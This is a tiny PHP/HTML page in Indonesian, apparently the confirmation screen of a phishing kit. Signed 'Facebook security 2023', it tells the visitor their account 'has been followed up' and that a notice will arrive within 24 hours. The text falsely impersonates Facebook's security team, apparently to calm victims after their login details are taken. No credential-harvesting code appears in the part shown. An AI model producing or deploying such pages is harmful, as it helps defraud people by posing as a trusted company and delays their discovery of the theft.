<?php
$random = rand(1000,5000);
?>
<title> Pemblokiran ! </title>
<center> <h2> TERIMAKASIH AKUN ANDA TELAH KAMI TINDAK LANJUTI,KAMI AKAN MENGIRIMKAN NOTIFIKASI SELANJUTNYA
DALAM 1x24 JAM,
</br>
</br>
Facebook security 2023, </h2><br>